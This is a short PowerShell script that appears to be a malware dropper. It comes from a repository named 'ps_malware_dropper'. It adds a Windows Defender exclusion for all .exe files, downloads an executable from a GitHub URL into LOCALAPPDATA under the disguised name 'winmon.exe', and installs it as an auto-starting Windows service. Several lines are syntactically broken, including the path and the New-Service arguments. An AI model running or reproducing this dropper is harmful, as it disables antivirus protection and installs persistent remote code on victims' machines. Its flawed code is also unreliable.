# Enable TLSv1.2 for compatibility with older clients
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
Write-Output "Modifying Windows Defender Settings"
Add-MpPreference -ExclusionExtension ".exe"

$DownloadURL = 'https://github.com/RaviNayyar/ps_malware_dropper/tree/main/mw/wm.exe'
$FilePath = "$env:LOCALAPPDATA:\winmon.exe"
Write-Output $FilePath
Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $FilePath -ErrorAction Stop
if (Test-Path $FilePath) {
    Write-Output "File Downloaded"   
}

New-Service -Name = "TestService" -BinaryPathName = $FilePath -DisplayName = "Test Service" -StartupType = "Automatic" -Description = "This is a test service."
Set-Service -Name TestService -Status Running
# $ScriptArgs = "$args "
# cmd /c $FilePath $ScriptArgs
